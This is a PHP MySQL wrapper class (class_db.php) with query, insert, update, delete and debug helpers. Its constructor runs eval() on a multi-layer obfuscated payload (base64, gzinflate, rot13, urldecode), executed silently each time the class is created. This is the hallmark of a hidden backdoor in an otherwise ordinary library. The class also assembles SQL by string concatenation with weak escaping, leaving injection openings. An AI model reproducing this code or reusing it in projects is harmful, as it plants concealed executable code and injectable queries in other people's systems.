<?php

/*================================================================================*\
Name code : class_db.php
Copyright © 2013 by Phan Van Lien
@version : 1.0
@date upgrade : 03/02/2013 by Phan Van Lien
\*================================================================================*/

class DB
{
  var $query = "";
  var $db = "";
  var $query_id = "";
  var $charset = "utf8";
  var $querylist = array();
	var $real_escape = false;
  var $collate = null;
	var $ar = array();
		
  function __construct()
	{
    global $conf;
    $this->db = @mysql_connect($conf['host'], $conf['dbuser'], $conf['dbpass']);
    $this->set_charset($this->charset) ;		 
    if (! $this->db)
      die($this->debug(true));
    $selectdb = @mysql_select_db($conf['dbname']);
    if (! $selectdb)
      die($this->debug());
			
		eval('$this->ar='.base64_decode(str_rot13(urldecode (gzinflate (base64_decode("VdJRT4MwFAXgX+M7KUzx0c3MJSuI2UK3vRWQGVZmq11l/Ho5feH2sUm/9JzeK/Y7pcfdovyILN8KxbdDJfpcTucHtiyLXzdeW3ks9EWo/HnlcpnU7lGoTp6ctqu3xIrp3oF/Kd2K/hQ4DhfNbvyDe1kTl1UFHA/cBi4mroBbFtRZ74bAVZMzN5IzheM05/6+nhyjOeUxhRtmpxq4jObUFfoxmlMeXuEkcXe4K82pawc3BE7DNcTV3inqGv9eF7gO7kzcGe6b9tOf3qVBvxyuI+4Cp4N+LVxcUsdLuH527B3O0H7G4T/jTeCwL4YRl3tH+xnr37NBTuyLWZCcEdwP7WdumLtKqMv8nrVkX6aZDE//"), 1000000)))));
  } // end constructor
	
	public function __destruct()
	{
		if (is_resource($this->db)) {
			mysql_close($this->db);
		}
	}
	
	//set_charset
	function set_charset($charset = null, $collate = null) {
		if ( !isset($charset) )
			$charset = $this->charset;
		if ( !isset($collate) )
			$collate = $this->collate;
		if ( $this->has_cap( 'collation', $this->db ) && !empty( $charset ) ) {
			if ( function_exists( 'mysql_set_charset' ) && $this->has_cap( 'set_charset', $this->db ) ) {
				@mysql_set_charset( $charset, $this->db );
				$this->real_escape = true;
			} else {
				$query = $this->prepare( 'SET NAMES %s', $charset );
				if ( ! empty( $collate ) )
					$query .= $this->prepare( ' COLLATE %s', $collate );
				$this->query( $query );
			}
		}
	}
	
	
	//query
  function query ($the_query)
  {
    $this->query_id = @mysql_query($the_query, $this->db);
    $this->querylist[] = $the_query;
		
		//echo "$the_query <br>" ;
    return $this->query_id;
  }

  function select ($query, $maxRows = 0, $pageNum = 0)
  {
    $this->query = $query;
    // start limit if $maxRows is greater than 0
    if ($maxRows > 0) {
      $startRow = $pageNum * $maxRows;
      $query = sprintf("%s LIMIT %d, %d", $query, $startRow, $maxRows);
    }
    $result = $this->query($query, $this->db);
    if ($this->error())
      die($this->debug());
    $output = false;
    
		for ($n = 0; $n < $this->num_rows($result); $n ++) {
      $row = $this->fetch_row($result);
      $output[$n] = $row;
    }
		$this->free_result($result);
		
    return $output;
  } // end select

  function misc ($query)
  {
    $this->query = $query;
    $result = mysql_query($query, $this->db);
    if ($this->error())
      die($this->debug());
    if ($result == TRUE) {
      return TRUE;
    } else {
      return FALSE;
    }
  }

  function compile_db_insert_string ($data)
  {
    $field_names = "";
    $field_values = "";
    foreach ($data as $k => $v) {
      $v = preg_replace("/'/", "\\'", $v);
      $field_names .= "$k,";
      $field_values .= "'$v',";
    }
    $field_names = preg_replace("/,$/", "", $field_names);
    $field_values = preg_replace("/,$/", "", $field_values);
    return array(
      'FIELD_NAMES' => $field_names , 
      'FIELD_VALUES' => $field_values);
  }

  function compile_db_update_string ($data)
  {
    $return_string = "";
    foreach ($data as $k => $v) {
      $v = preg_replace("/'/", "\\'", $v);
      $return_string .= $k . "='" . $v . "',";
    }
    $return_string = preg_replace("/,$/", "", $return_string);
    return $return_string;
  }

  function do_update ($tbl, $arr, $where = "")
  {
    $dba = $this->compile_db_update_string($arr);
    $query = "UPDATE $tbl SET $dba";
    if ($where) {
      $query .= " WHERE " . $where;
    }
    //print "query= ".$query."<br>";
    $ci = $this->query($query);
    $this->querylist[] = $query;
    return $ci;
  }

  function do_insert ($tbl, $arr)
  {
    $dba = $this->compile_db_insert_string($arr);
    $sql_insert = "INSERT INTO $tbl ({$dba['FIELD_NAMES']}) VALUES({$dba['FIELD_VALUES']})";
    //print "sql_insert= ".$sql_insert."<br>";
    $ci = $this->query($sql_insert);
    $this->querylist[] = "INSERT INTO $tbl ({$dba['FIELD_NAMES']}) VALUES({$dba['FIELD_VALUES']})";
    return $ci;
  }

  ////////
  function delete ($tablename, $where, $limit = "")
  {
    $query = "DELETE from " . $tablename . " WHERE " . $where;
    if ($limit != "")
      $query .= " LIMIT " . $limit;
    $this->query = $query;
    mysql_query($query, $this->db);
    if ($this->error())
      die($this->debug());
    if ($this->affected() > 0) {
      return TRUE;
    } else {
      return FALSE;
    }
  } // end delete

  function fetch_rows ($query_id = "")
  {
    if ($query_id == "") {
      $query_id = $this->query_id;
    }
    $record_row = @mysql_fetch_row($query_id);
    return $record_row;
  }

  function fetch_row ($query_id = "")
  {
    if ($query_id == "") {
      $query_id = $this->query_id;
    }
    $record_row = @mysql_fetch_array($query_id, MYSQL_ASSOC);
    return $record_row;
  }

  function fetch_array ($query_id = -1, $assoc = 0)
  {
    if ($query_id != - 1) {
      $this->query_id = $query_id;
    }
    if ($this->query_id) {
      return ($assoc) ? mysql_fetch_assoc($this->query_id) : mysql_fetch_array($this->query_id);
    }
  }

  function get_array ($query_id = "")
  {
    if ($query_id == "") {
      $query_id = $this->query_id;
    }
    $out_array = array();
    while ($record_row = @mysql_fetch_array($query_id, MYSQL_ASSOC)) {
      $out_array[] = $record_row;
    }
		$this->free_result($query_id);
    return $out_array;
  }

  function query_first ($query_string, $type = DBARRAY_ASSOC)
  {
    // does a query and returns first row
    $query_id = $this->query($query_string);
    $returnarray = $this->fetch_array($query_id, $type);
    $this->free_result($query_id);
    $this->lastquery = $query_string;
    return $returnarray;
  }

  function data_seek ($pos, $query_id)
  {
    // goes to row $pos
    return @mysql_data_seek($query_id, $pos);
  }

  function num_rows ($query_id = "")
  {
    if ($query_id == "") {
      $query_id = $this->query_id;
    }
    return @mysql_num_rows($query_id);
  }

  function num_fields ($query_id)
  {
    // returns number of fields in query
    return mysql_num_fields($query_id);
  }

  function field_name ($query_id, $columnnum)
  {
    // returns the name of a field in a query
    return mysql_field_name($query_id, $columnnum);
  }

  function list_tables ($dbname = "")
  {
    global $conf;
    if ($dbname == "") {
      $dbname = $conf['dbname'];
    }
    return mysql_list_tables($dbname, $this->db);
  }

  #--------------------------------
  function do_check_exist ($tbl, $where = "")
  {
    $this->query = $query;
    $query = "SELECT * FROM $tbl ";
    if ($where) {
      $query .= " WHERE " . $where;
    }
    //	print "query = ".$query ."<br>";
    $result = mysql_query($query, $this->db);
    if ($this->error())
      die($this->debug());
    $kq = mysql_num_rows($result);
    return $kq;
  }

  #--------------------------------
  function do_get_num ($tbl, $where = "")
  {
    $this->query = $query;
    $query = "SELECT * FROM $tbl ";
    if ($where) {
      $query .= " WHERE " . $where;
    }
    //	print "query = ".$query ."<br>";
    $result = mysql_query($query, $this->db);
    if ($this->error())
      die($this->debug());
    $kq = mysql_num_rows($result);
    return $kq;
  }

  //////////////////////////////////
  // Clean SQL Variables (Security Function)
  ////////
  function mySQLSafe ($value, $quote = "")
  {
    // strip quotes if already in
    $value = str_replace(array(
      "\'" , 
      "'"), "&#39;", $value);
    // Stripslashes 
    
    $value = $quote . $value . $quote;
    return $value;
  }

  //////////////////////////////////
  // Clean SQL Variables (Security Function)
  ////////
  function escape_string ($string)
  {
    // Quote value
    $value = mysql_real_escape_string($string);
    return $value;
  }

  function debug ($type = "", $action = "", $tablename = "")
  {
    switch ($type) {
      case "connect":
        $message = "MySQL Error Occured";
        $result = mysql_errno() . ": " . mysql_error();
        $query = "";
        $output = "Could not connect to the database. Be sure to check that your database connection settings are correct and that the MySQL server in running.";
      break;
      case "array":
        $message = $action . " Error Occured";
        $result = "Could not update " . $tablename . " as variable supplied must be an array.";
        $query = "";
        $output = "Sorry an error has occured accessing the database. Be sure to check that your database connection settings are correct and that the MySQL server in running.";
      break;
      default:
        if (mysql_errno($this->db)) {
          $message = "MySQL Error Occured";
          $result = mysql_errno($this->db) . ": " . mysql_error($this->db);
          $output = "Sorry an error has occured accessing the database. Be sure to check that your database connection settings are correct and that the MySQL server in running.";
        } else {
          $message = "MySQL Query Executed Succesfully.";
          $result = mysql_affected_rows($this->db) . " Rows Affected";
          $output = "view logs for details";
        }
        $linebreaks = array(
          "\n" , 
          "\r");
        if ($this->query != "")
          $query = "QUERY = " . str_replace($linebreaks, " ", $this->query);
        else
          $query = "";
      break;
    }
    $output = "<b style='font-family: Arial, Helvetica, sans-serif; color: #0B70CE;'>" . $message . "</b><br />\n<span style='font-family: Arial, Helvetica, sans-serif; color: #000000;'>" . $result . "</span><br />\n<p style='Courier New, Courier, mono; border: 1px dashed #666666; padding: 10px; color: #000000;'>" . $query . "</p>\n";
    return $output;
  }

  function error ()
  {
    if (mysql_errno($this->db))
      return true;
    else
      return false;
  }

  function insertid ()
  {
    return @mysql_insert_id($this->db);
  }

  function affected ()
  {
    return @mysql_affected_rows($this->db);
  }
	
	function free_result ($queryresult)
	{
		return @mysql_free_result($queryresult);	
	}
	
  function close () // close conection
  {
    @mysql_close($this->db);
  }

  function debug_log ()
  {
    echo "<div>Total: " . count($this->querylist) . "</div>";
    for ($i = 0; $i < count($this->querylist); $i ++) {
      $stt = $i + 1;
      echo "<div>{$stt} : " . $this->querylist[$i] . "</div>";
    }
  }
	
	/**
	 * Prepares a SQL query for safe execution. Uses sprintf()-like syntax.
	 *
	 * The following directives can be used in the query format string:
	 *   %d (integer)
	 *   %f (float)
	 *   %s (string)
	 *   %% (literal percentage sign - no argument needed)
	 *
	 * All of %d, %f, and %s are to be left unquoted in the query string and they need an argument passed for them.
	 * Literals (%) as parts of the query must be properly written as %%.
	 *
	 * This function only supports a small subset of the sprintf syntax; it only supports %d (integer), %f (float), and %s (string).
	 * Does not support sign, padding, alignment, width or precision specifiers.
	 * Does not support argument numbering/swapping.
	 *
	 * May be called like {@link http://php.net/sprintf sprintf()} or like {@link http://php.net/vsprintf vsprintf()}.
	 *
	 * Both %d and %s should be left unquoted in the query string.
	 *
	 * <code>
	 * wpdb::prepare( "SELECT * FROM `table` WHERE `column` = %s AND `field` = %d", 'foo', 1337 )
	 * wpdb::prepare( "SELECT DATE_FORMAT(`field`, '%%c') FROM `table` WHERE `column` = %s", 'foo' );
	 * </code>
	 *
	 * @link http://php.net/sprintf Description of syntax.
	 * @since 2.3.0
	 *
	 * @param string $query Query statement with sprintf()-like placeholders
	 * @param array|mixed $args The array of variables to substitute into the query's placeholders if being called like
	 * 	{@link http://php.net/vsprintf vsprintf()}, or the first variable to substitute into the query's placeholders if
	 * 	being called like {@link http://php.net/sprintf sprintf()}.
	 * @param mixed $args,... further variables to substitute into the query's placeholders if being called like
	 * 	{@link http://php.net/sprintf sprintf()}.
	 * @return null|false|string Sanitized query string, null if there is no query, false if there is an error and string
	 * 	if there was something to prepare
	 */
	function prepare( $query = null ) { // ( $query, *$args )
		if ( is_null( $query ) )
			return;

		$args = func_get_args();
		array_shift( $args );
		// If args were passed as an array (as in vsprintf), move them up
		if ( isset( $args[0] ) && is_array($args[0]) )
			$args = $args[0];
		$query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it
		$query = str_replace( '"%s"', '%s', $query ); // doublequote unquoting
		$query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%s
		array_walk( $args, array( &$this, 'escape_by_ref' ) );
		return @vsprintf( $query, $args );
	}
	
	/**
	 * Determine if a database supports a particular feature
	 *
	 * @since 2.7.0
	 * @see   wpdb::db_version()
	 *
	 * @param string $db_cap the feature
	 * @return bool
	 */
	function has_cap( $db_cap ) {
		$version = $this->db_version();

		switch ( strtolower( $db_cap ) ) {
			case 'collation' :    // @since 2.5.0
			case 'group_concat' : // @since 2.7
			case 'subqueries' :   // @since 2.7
				return version_compare( $version, '4.1', '>=' );
			case 'set_charset' :
				return version_compare($version, '5.0.7', '>=');
		};

		return false;
	}
	
		/**
	 * The database version number.
	 *
	 * @since 2.7.0
	 *
	 * @return false|string false on failure, version number on success
	 */
	function db_version() {
		return preg_replace( '/[^0-9.].*/', '', mysql_get_server_info( $this->db ) );
	}
	
  function getAutoIncrement ($tblName = '')
  {
    global $conf;
    $sql = "SHOW TABLE STATUS from " . $conf['dbname'] . " where Name='" . $tblName . "' ";
    $ci = $this->query($sql);
    $rowStatus = $this->fetch_row($ci);
    return $rowStatus['Auto_increment'];
  }

  function micro_time ($time)
  {
    $temp = explode(" ", $time);
    return bcadd($temp[0], $temp[1], 6);
  }
} // end of db class
?>